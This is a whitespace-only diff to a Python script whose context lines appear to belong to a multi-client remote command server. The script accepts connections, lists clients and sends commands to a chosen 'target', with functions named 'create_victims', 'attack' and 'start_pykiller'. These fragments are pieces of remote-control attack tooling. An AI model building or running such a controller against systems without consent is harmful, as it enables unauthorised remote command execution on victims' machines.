@@ -23,6 +23,7 @@ queue = Queue()
 all_connections = []
 all_addresses = []
 
+
 # Create socket (allows two computers to connect)
 def socket_create():
     try:
@@ -34,6 +35,7 @@ def socket_create():
         s = socket.socket()
     except socket.error as msg:
         print("Socket creation error: " + str(msg))
+
 
 def socket_bind():
     try:
@@ -47,6 +49,7 @@ def socket_bind():
         print("Socket binding error: " + str(msg))
         time.sleep(5)
         socket_bind()
+
 
 # Accept connections from multiple clients and save to list
 def accept_connections():
@@ -67,6 +70,7 @@ def accept_connections():
         except:
             print("Erro accepting connections")
 
+
 # Interactive prompt for sending commands remotely
 def start_pykiller():
     while True:
@@ -79,6 +83,7 @@ def start_pykiller():
                 send_target_commands(conn)
         else:
             print(colored("Command not recognized", 'yellow'))
+
 
 # Display all current connections
 def list_connections():
@@ -94,6 +99,7 @@ def list_connections():
         results += str(i) + '   ' + str(all_addresses[i][0]) + '   ' + str(all_addresses[i][1]) + '\n'
     print(colored('+++++ Clients List +++++', 'blue') + '\n' + results)
 
+
 # Select a target Client
 def get_target(cmd):
     try:
@@ -107,7 +113,8 @@ def get_target(cmd):
         print(colored("Not a valid selection", 'red'))
         return None
 
-    # Connect with remote target client
+
+# Connect with remote target client
 def send_target_commands(conn):
     while True:
         try:
@@ -122,12 +129,14 @@ def send_target_commands(conn):
             print("Connection was lost")
             break
 
+
 # Create victim threads
 def create_victims():
     for _ in range(NUMBER_OF_THREADS):
         t = threading.Thread(target=attack)
         t.daemon = True
         t.start()
+
 
 def attack():
     while True:
@@ -139,6 +148,7 @@ def attack():
         if x == 2:
             start_pykiller()
         queue.task_done()
+
 
 def create_jobs():
     for x in JOB__NUMBER:
